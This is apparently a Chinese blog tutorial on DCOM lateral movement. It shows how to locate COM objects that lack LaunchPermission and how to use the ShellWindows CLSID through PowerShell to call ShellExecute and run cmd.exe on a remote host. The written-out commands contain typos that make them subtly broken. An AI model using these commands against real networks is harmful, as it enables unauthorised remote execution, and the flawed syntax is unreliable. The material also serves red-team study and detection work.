> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/1-1tXKu_o2ceeelOurEUfQ)

在第一篇横向移动中我们使用了 MMC20.APPLICATION COM 对象来进行横向移动，其实我们可以思考一个问题，微软的 COM 不只有 MMC20.APPLICATION。

```
https://docs.microsoft.com/en-us/windows/win32/com/com-technical-overview
Microsoft组件对象模型（COM）定义了一个二进制互操作性标准，用于创建在运行时进行交互的可重用软件库。您可以使用COM库，而无需将其编译到应用程序中。
```

那么是不是还存在别的 COM 模型给我们去利用？我们还可以思考一个问题：

```
我们只能利用来进行横向移动吗？
```

显然答案是否定的。

然后我们还应该思考一个问题：为什么在如此多的 COM 程序中，MMC20.APPLICATION 能成为一个利用点？也就是说成为一个利用点的要素是什么？

```
远程链接
可控性
.....
```

如果想要找到更多的利用点，我们的知道微软的所有的 COM 程序。通过阅读微软的文档我们知道可以在注册表中找到所有的 COM 程序。

```
https://docs.microsoft.com/en-us/windows/win32/com/registering-com-applications
注册表维护有关系统中安装的所有COM对象的信息。每当应用程序创建COM组件的实例时，都会查询注册表以将组件的CLSID或ProgID解析为包含它的服务器DLL或EXE的路径名。
确定组件的服务器后，Windows会将服务器加载到客户端应用程序的进程空间中（进程内组件），或者在自己的进程空间中启动服务器（本地和远程服务器）。
服务器创建组件的实例，并向客户端返回对组件接口之一的引用。
```

这里我们需要使用一个工具来帮助我们去查找

```
https://github.com/tyranid/oleviewdotnet/releases/tag/v1.11
OleViewDotNet是一个.NET 4应用程序，提供了一个工具，该工具合并了经典的SDK工具将OleView和测试容器集成到一个应用程序中。
它允许您通过以下方式查找COM对象枚举许多不同的视图（例如，按CLSID，按ProgID，按服务器可执行文件）接口在对象上，然后创建实例并调用方法。
它也有一个基本的攻击ActiveX对象的容器，这样您就可以在操作时看到显示输出数据。
```

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/nzxUaDY8yDBrichswjOLcDovdPc33hnjNbN9tTMWibYG2oFUmAsWIyictwFWWgsW7ZNdFKPe65iaV8sXfX5nUQiaiaFw/640?wx_fmt=jpeg)  

如何快速地找到可以利用的 COM 程序呢。

从第一篇中我们知道

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/nzxUaDY8yDBrichswjOLcDovdPc33hnjNGpHyl86MVSyEvWsRI9zicIaQNXe8pCNLhca41icicREUJbz7zHDTEy4bQ/640?wx_fmt=jpeg)

那么我们可以查找那些具有没有限制的 COM 程序 (LAnunchPermission == None)

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/nzxUaDY8yDBrichswjOLcDovdPc33hnjNcR9Rtjz9icDUY5Fl4WKGWL2pL2VswtRlSnHGSzTBlZAcgxXfw67X7YA/640?wx_fmt=jpeg)

还有一种方法就是：

```
查找HKCR：\ AppID \ {guid}中的键缺少的值“ LaunchPermission”。设置了“启动许可”的对象将如下所示，其中的数据代表二进制格式的对象的ACL：
```

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/nzxUaDY8yDBrichswjOLcDovdPc33hnjNq5BslTPZgAQa95iaztxqqiasvQGYBrnuCHDcgYUFBqgXia82fhDTgRpfw/640?wx_fmt=jpeg)

没有明确设置 LaunchPermission 的用户将没有该特定注册表项。

我们可以看到 shellwindows 和 shellBrowserWindows 都好像存在利用点。那么我们可以开始构造利用语法：

```
$a = [type]::GetTypeFromProgID("shellwindows")
$b = [activator]::createInstance($a) | get-member
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDBrichswjOLcDovdPc33hnjNrK4MsrX9rGAzticicJFnlmeMibHibmNzDm6UBABvTZ8zUpKfCalv5dFoZA/640?wx_fmt=png)

意思就是说 $a 中的值不是一种值，具有不确定性。我们回看到 $a 中，我们发现 GetTypeFromProgID 可能存在问题：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDBrichswjOLcDovdPc33hnjNepqHxiaQ1z8R7HibZh1bCiaib6CFsiaAXAMewticEIgyRQIJjiaoGZvictpjgQ/640?wx_fmt=png)

从微软文档中我们可以看到 GetTypeFromProgID 需要指定一个 ProgID 值，而 Shellwindows 明显不是 ProgID 值，所以没办法定位到。

所以我们得使用一种新的方法去定位我们想要的东西。在翻看微软的文档后

```
https://docs.microsoft.com/en-us/windows/win32/com/com-technical-overview
接口是强类型的。每个接口都有其自己的唯一接口标识符，称为IID，它消除了人类可读名称可能发生的冲突。IID是全局唯一标识符（GUID）
```

GUID 具有唯一性，我们可以使用 Guid 了定位。

```
https://docs.microsoft.com/en-us/dotnet/api/system.type.gettypefromclsid?view=net-5.0
GetTypeFromCLSID（向导，字符串，布尔值）
从指定的服务器获取与指定的类标识符（CLSID）关联的类型，并指定在加载类型时发生错误时是否引发异常。
Type GetTypeFromCLSID (Guid clsid, string server, bool throwOnError);
```

然后在 Oleview.NET 中我们能找到 Guid 值

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/nzxUaDY8yDBrichswjOLcDovdPc33hnjNpeYq8ZL4yg99UmZNziauKvOicpZgXKqVS3mriaS77mDGKuU6YMicCMeCLQ/640?wx_fmt=jpeg)

构造一下利用语法

```
$a = [type]::GetTypeFromCLSID("9BA05972-F6A8-11CF-A442-00A0C90A8F39"."10.10.10.10") | get-member
$a
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDBrichswjOLcDovdPc33hnjNNKeVelx6aKNPdpUR70ZlEFoTm5t3z9bac9hxXsQVJeDYeCpBKXjVrA/640?wx_fmt=png)

在上一篇中，我们说到翻东西，其实翻东西也是有 TIps 的。例如优先看是否以下的东西

```
Shell
Execute
Navigate
DDEInitiate
CreateObject
RegisterXLL
ExecuteLine
NewCurrentDatabase
Service
Create
Run
Exec
Invoke
File
Method
Explore
```

ok 翻东西不多说

我们拿到了 ShellWindows 对象，下一步加油实例化该对象。

```
$a =  [activator]::CreateInstance([type]::GetTypeFromCLSID("9BA05972-F6A8-11CF-A442-00A0C90A8F39","10.10.10.10")).Document | Get-member
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDBrichswjOLcDovdPc33hnjNfpR0zHzlp6BAcicVYSmGKHzmvP4EQ9sUKpOiatqyBPNqZ5Lu0sSl38TQ/640?wx_fmt=png)

通过在远程主机上实例化对象，我们可以与该对象进行接口并调用所需的任何方法。返回给该对象的句柄揭示了几种方法和属性，我们无法与它们进行交互。为了实现与远程主机的实际交互，我们需要使用 WindowsShell.Item 方法，它将为我们提供一个代表 Windows Shell 窗口的对象：

```
https://docs.microsoft.com/zh-cn/windows/win32/shell/shellwindows-item?redirectedfrom=MSDN
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDBrichswjOLcDovdPc33hnjNaxjbbO6fzziaXbIYE0WDiaMLwZnKichAhF55rKsic5bQykpfJic0lOMSqWw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDBrichswjOLcDovdPc33hnjN4Qy39ZgZ5hIGWBkFxe6eic7GAVRYTotpY9Gf7o4E7htrBs1EVkwcWCQ/640?wx_fmt=png)

有了 Shell Window 的完整句柄，我们现在可以访问所有公开的预期方法 / 属性。通过这些方法后，

我们看到 “Document.Application.ShellExecute”。确保遵循该方法的参数要求，

![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDBrichswjOLcDovdPc33hnjNfSVBAQlRAIYTCZ3yKmpOVFzoAqIznoUTBfibicVhiatw8DONXmiagRzEvg/640?wx_fmt=png)

```
https://docs.microsoft.com/zh-cn/windows/win32/shell/shell-shellexecute?redirectedfrom=MSDN
```

```
$a =  [activator]::CreateInstance([type]::GetTypeFromCLSID("9BA05972-F6A8-11CF-A442-00A0C90A8F39","10.10.10.10")).Document.Application.ShellExecute("cmd.exe","/c clac.exe"."c:\windows32\system",$null,0)
```

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/nzxUaDY8yDBrichswjOLcDovdPc33hnjNrmM6Lp3fzxC9YicnuL3mZhia1YQbNgJR8mtpCqP2iaAtJZJ9sGlZQmkQw/640?wx_fmt=jpeg)

与大多数其他方法不同，ShellWindows 不会创建进程。相反，它会激活现有 explorer.exe 进程内部的类实例，该进程执行子进程。为了进行通信，主机 explorer.exe 在 DCOM 端口上打开了一个侦听套接字，该套接字应明确标记此技术。

除了上面的，公开的利用方法还有很多，我们自己也可以按照思路去发现一些新的手法。

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/nzxUaDY8yDDJOZL7vdiayia2sqvjTN70cUW7agxb7HLUicnYvpZjl0gZzWnaOuKS0DicNcEz2B4FbdZep983wp69OQ/640?wx_fmt=jpeg)